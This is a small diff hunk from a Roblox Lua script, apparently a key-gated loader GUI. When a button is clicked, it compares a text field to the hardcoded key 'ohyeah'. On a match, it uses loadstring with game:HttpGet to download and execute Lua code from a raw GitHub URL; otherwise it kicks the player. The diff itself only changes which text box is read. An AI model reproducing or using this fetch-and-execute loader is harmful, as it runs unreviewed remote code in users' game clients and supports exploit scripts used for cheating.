@@ -45,7 +45,7 @@ local function AMCDZO_fake_script() -- passw.Script
 	local script = Instance.new('Script', passw)
 
 	script.Parent.Enter.MouseButton1Click:Connect(function()
-		if script.Parent.TextBox.Text == "ohyeah" then
+		if script.Parent.passb.Text == "ohyeah" then
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/imiranian/Syx/main/Main", true))()
 		else
 			game.Players.LocalPlayer:Kick("LolKeyIsWrong")
